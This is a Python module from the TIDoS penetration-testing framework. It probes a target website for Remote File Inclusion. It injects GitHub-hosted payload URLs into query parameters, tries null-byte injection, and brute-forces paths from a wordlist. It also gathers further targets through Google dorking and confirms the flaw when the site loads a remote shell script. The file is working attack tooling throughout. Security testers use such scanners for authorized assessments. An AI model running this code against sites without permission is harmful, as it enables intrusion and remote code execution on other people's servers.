#!/usr/bin/env python3
# coding: utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author : @_tID
#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework


import os
import sys
#import requests
import time

from googlesearch import search


import urllib.request
from random import randint
from time import sleep
from multiprocessing import Pool, TimeoutError
from core.methods.multiproc import listsplit
from core.variables import processes
from core.Core.colors import *
from core.methods.tor import session

from core.database.database_module import save_data
from core.variables import database
from core.methods.cache import targetname
import inspect

info = "This module scans the target site for Remote File Inclusion vulnerabilities by either a specific attack, or by brute force."
searchinfo = "Remote File Inclusion Scanner"
properties = {"PARAM":["Directory and Parameter to attack (eg /vuln/page.php?q=lmao)", " "], "PARALLEL":["Parallelise Attack? [1/0]", " "], "DICT":["Path to dictionary to be used in normal attacks (default: files/fuzz-db/rfi_paths.lst)", " "]}

global web

goog = []
payloads = []
payload_url = 'https://raw.githubusercontent.com/VainlyStrain/TIDoS/master/tmp/TIDoS'
payload_1 = '#!/bin/sh'
payload_2 = 'cd /opt/TIDoS'
payload_3 = 'python /opt/TIDoS/TIDoS.py'

def clear_cookie():
    fo = open(".google-cookie", "w")
    fo.close()

def cust0x00(web, parallel):
    if properties["PARAM"][1] == " ":
        web0 = input(GR+' [§] Enter the point scope parameter :> ')
    else:
        web0 = properties["PARAM"][1]

    if str(web0).startswith('/'):
        print(GR+' [!] Your input has a "/" in the beginning,..')
        fof = input(O+' [§] Do you mean root directory? (y/n) :> ')
        if fof == 'y' or fof == 'Y':
            pass
        elif ((fof == 'n') or (fof == 'N')):
            web0 = web0.replace('/','')
            pass
    test(web0, web)
    print(G+' [+] Done!')
    time.sleep(0.6)
    i = input(O+' [§] Proceed to Brute Module? (y/n) :> ')
    if i == 'y' or i == 'Y':
        print(G+' [+] Moving on...')
        brute0x00(web, parallel)
    elif i == 'n' or i == 'N':
        print(G+' [+] RFi completed!')
        time.sleep(0.5)

def test(web0, web):
    requests = session()
    if (('=' in str(web0)) and ('?' in str(web0))):
        if 'http' in str(web0):
            web00 = str(web0)
        else:
            web00 = str(web) + str(web0)
        web0x0 = web00.split('=')[0]
        web0x0 = web0x0 + '='
        print(B+' [+] URL : '+C+web0x0)
        print(G+' [+] Url successfully parsed!')
        print(GR+' [*] Trying basic fetch...')
        payload = 'https://raw.githubusercontent.com/VainlyStrain/TIDoS/master/files/payload-db/json_payloads.lst'
        web000 = web0x0 + payload
        time.sleep(0.5)
        print(C+' [+] Payload Url : '+payload)
        print(GR+' [*] Fetching '+C+web000)
        om = u' '.join(requests.get(web000).text).encode('utf-8').strip()
        pm = str(om)
        if '''{"__class":"null","A":"B"}''' in str(pm) and '''{"toJSON":"while(1);"}''' in str(pm):
            print(G+' [+] Heuristics reveal that '+O+web00+G+' is vulnerable to Remote File Inclusion!')
            time.sleep(0.5)
            print(O+' [*] Confirming the vulnerability...')
            time.sleep(0.6)
            print(GR+' [*] Trying to load executable scripts...')
            web0x00 = web00 + payload_url
            print(C+' [+] Payload : '+B+payload_url)
            print(GR+' [*] Fetching '+C+web0x00)
            oom = requests.get(web0x00).text
            pom = str(oom)
            if ((payload_1 in pom) and (payload_2 in pom) and (payload_3 in pom)):
                print(G+' [+] Remote File Inclusion at '+O+web00+G+' is confirmed!')
                data = "Confirmed RFI Vulnerability @ " + web00 + "!"
                save_data(database, module, lvl1, lvl2, lvl3, name, data)

        elif 'Warning'.lower() in pm.lower():

            if (('=' in str(web0)) and ('?' in str(web0))):
                if 'http' in str(web0):
                    web00 = str(web0)
                else:
                    web00 = str(web) + str(web0)
                web0x0 = web00.split('=')[0]
                web0x0 = web0x0 + '='
                print(O+' [!] Heuristics reveal that the page may be vulnerable to RFI!')
                print(C+' [*] Trying null byte character injection...')
                payload1 = 'https://raw.githubusercontent.com/VainlyStrain/TIDoS/master/files/payload-db/json_payloads.lst%00'
                web000 = web0x0 + payload1
                time.sleep(0.5)
                print(C+' [+] Payload : '+payload1)
                print(GR+' [*] Fetching '+C+web000)
                om = u' '.join(requests.get(web000).text).encode('utf-8').strip()
                pm = str(om)
                if '''{"__class":"null","A":"B"}''' in str(pm) and '''{"toJSON":"while(1);"}''' in str(pm):
                    print(G+' [+] Heuristics reveal that '+O+web00+G+' is vulnerable to Remote File Inclusion!')
                    time.sleep(0.5)
                    print(O+' [*] Confirming the vulnerability...')
                    time.sleep(0.6)
                    print(GR+' [*] Trying to load executable scripts...')
                    web0x00 = web00 + payload_url
                    print(C+' [+] Payload : '+B+payload_url)
                    print(GR+' [*] Fetching '+C+web0x00)
                    oom = requests.get(web0x00).text
                    pom = str(oom)
                    if ((payload_1 in pom) and (payload_2 in pom) and (payload_3 in pom)):
                        print(G+' [+] Remote File Inclusion at '+O+web00+G+' is confirmed!')
                        data = "Confirmed RFI Vulnerability @ " + web00 + "!"
                        save_data(database, module, lvl1, lvl2, lvl3, name, data)
        else:
            if (('=' in str(web0)) and ('?' in str(web0))):
                if 'http' in str(web0):
                    web00 = str(web0)
                else:
                    web00 = str(web) + str(web0)
                web0x0 = web00.split('=')[0]
                web0x0 = web0x0 + '='
                print(O+' [!] Heuristics reveal that the page may not be vulnerable to RFI!')
                print(C+' [*] Trying null byte character injection...')
                payload1 = payload_url+'%00'
                web000 = web0x0 + payload1
                time.sleep(0.5)
                print(C+' [+] Payload : '+B+payload1)
                print(GR+' [*] Fetching '+C+web000)
                om = u' '.join(requests.get(web000).text).encode('utf-8').strip()
                pm = str(om)
                if (("I'm Feeling Lucky" in pm) and ('Google Search' in pm)):
                    print(G+' [+] Heuristics reveal that '+O+web00+G+' is vulnerable to Remote File Inclusion!')
                    time.sleep(0.5)
                    print(O+' [*] Confirming the vulnerability...')
                    time.sleep(0.6)
                    print(GR+' [*] Trying to load executable scripts...')
                    web0x00 = web00 + payload_url
                    print(C+' [+] Payload : '+B+payload_url)
                    print(GR+' [*] Fetching '+C+web0x00)
                    oom = requests.get(web0x00).text
                    pom = str(oom)
                    if ((payload_1 in pom) and (payload_2 in pom) and (payload_3 in pom)):
                        print(G+' [+] Remote File Inclusion at '+O+web00+G+' is confirmed!')
                        data = "Confirmed RFI Vulnerability @ " + web00 + "!"
                        save_data(database, module, lvl1, lvl2, lvl3, name, data)
                else:
                    data = "(custom) no vulnerability found."
                    save_data(database, module, lvl1, lvl2, lvl3, name, data)
                    print(R+' [-] This RFI module could not find out any RFI.')
                    print(O+' [-] This module is extreme basic (more improvements on the way).')
    else:
        print(R+' [-] URL without parameter : '+O+web0)

def google_it (dork):
    clear_cookie()
    for title in search(dork, stop=30):
        print(G+' [+] Site Found :> '+B+title)
        time.sleep(0.7)
        goog.append(title)

def checkbrute(payloads, web):
    success = []
    requests = session()
    for pay in payloads:
        try:
            pay = pay.replace('XXpathXX',payload_url)
            web0x00 = web + pay
            req = requests.get(web0x00, allow_redirects=False, timeout=7, verify = False)
            c = str(req.status_code)
            if c == '200' and payload_1 in req.text and payload_2 in req.text and payload_3 in req.text:
                print(G+' [+] Possible RFi at : '+O+web0x00+G+' (200)')
                success.append(web0x00)
            elif c == '404':
                print(B+' [*] Checking dir : '+C+web0x00+R+' (404)')
            elif c == '302':
                print(B+' [*] Possible RFi : '+C+web0x00+GR+' (302)')
            else:
                print(O+' [*] Interesting response : '+GR+web0x00+O+' ('+c+')')

        except Exception:
            print(R+' [-] Exception Encountered!')
            pass
    return success

def brute0x00(web, parallel):
    try:
        if properties["DICT"][1] == " ":
            print(O+' [!] Enter path to payload file '+R+'(Default: files/fuzz-db/rfi_paths.lst)')
            fi = input(O+' [§] Your input (Press Enter if default) :> ')
        elif properties["DICT"][1].lower() == "none":
            fi = ""
        else:
            fi = properties["DICT"][1]

        if fi == '':
            fi = 'files/fuzz-db/rfi_paths.lst'

        print(GR+' [*] Importing wordlist...')
        if os.path.exists(fi) == True:
            print(G+' [+] File path found!')
            time.sleep(0.6)
            print(O+' [*] Importing wordlist...')
            with open(fi,'r') as wew:
                for w in wew:
                    w = w.strip('\n')
                    payloads.append(w)
            print(GR+' [*] Starting bruteforce...')
            time.sleep(0.7)
            success = []
            if not parallel:
                success += checkbrute(payloads, web)
            else:
                paylists = listsplit(payloads, round(len(payloads)/processes))
                with Pool(processes=processes) as pool:
                    res = [pool.apply_async(checkbrute, args=(l,web,)) for l in paylists]
                    for y in res:
                        i = y.get()
                        success += i
            if success:
                data = "Possible RFI at: " + str(success)
                save_data(database, module, lvl1, lvl2, lvl3, name, data)
                print(" [+] Remote File Inclusion found! Successful payloads:")
                for i in success:
                    print(i)
            else:
                print(R + "\n [-] No payload succeeded."+C)
                save_data(database, module, lvl1, lvl2, lvl3, name, "(brute) no payload succeeded.")

    except Exception as e:
        print(R+' [-] Unexpected Exception Encountered!')
        print(R+' [-] Exception : '+str(e))

def auto0x00(web, parallel):

    try:
        print(C+' [-] Warning! You may get a captcha if you are being too frequent...')
        sleep(0.4)
        print(O+' [*] Initializing module [1] Google Dorking...')
        google_it (str("site:"+web+' inurl:"?" AND inurl:"="'))
        if goog:
            print(G+' [+] Sites found : '+ str(len(goog)))
            time.sleep(0.5)
            for go in goog:
                test(go, web)
        else:
            print(R+' [-] No sites found via Google Dorks...')
            print(G+' [+] Moving on...')
            time.sleep(0.5)
            i = input(O+' [§] Do you want to use custom module (Y/n) :> '+C)
            if i == 'y' or i == 'Y':
                print(G+' [+] Loading the custom module...\n')
                time.sleep(0.6)
                cust0x00(web, parallel)
                print(G+' [+] Custom Module completed!')
                time.sleep(0.7)
                print(GR+' [*] Initializing module [3] Bruter...')
                brute0x00(web, parallel)
            elif i == 'n':
                print(GR+' [*] Okay...')
                time.sleep(0.7)
                print(GR+' [*] Initializing module [3] Bruter...')
                brute0x00(web, parallel)
            else:
                print(R+'\n [-] Sorry fam! You just typed SHIT!\n')
                time.sleep(0.8)

    except urllib.error.HTTPError as err:
        if err.code == 503:
            print(R+' [-] Captcha appeared...\n')
            print(O+' [!] Use the custom module and the brute module next...')
            pass

    except urllib.error.URLError:
        print(R+' [-] No network connectivity!')

def rfi(web):
    global name
    name = targetname(web)
    global lvl2
    lvl2 = inspect.stack()[0][3]
    global module
    module = "VulnAnalysis"
    global lvl1
    lvl1 = "Critical Vulnerabilities"
    global lvl3
    lvl3 = ""
    #print(R+'\n   ===========================================')
    #print(R+'\n    R E M O T E   F I L E   I N C L U S I O N')
    #print(R+'   ---<>----<>----<>----<>----<>----<>----<>--\n')

    from core.methods.print import pvln
    pvln("remote file inclusion") 

    if properties["PARALLEL"][1] == " ":
        pa = input(" [?] Parallel Attack? (enter if not) :> ")
        parallel = pa != ""
    else:
        parallel = properties["PARALLEL"][1] == "1"
                
    print(C+'    Choose from the options:\n')
    print(B+'    [1] Custom Targetting')
    print(B+'    [2] Automated Scanning\n')

    m = input(O+' [§] TID :> ')

    if str(web).endswith('/'):
        pass
    else:
        web = web + '/'

    if m == '1':
        cust0x00(web, parallel)

    elif m == '2':
        auto0x00(web, parallel)

    else:
        print(G+' [+] U mad?')
        time.sleep(0.9)
        print('')
        rfi(web)

def attack(web):
    web = web.fullurl
    rfi(web)
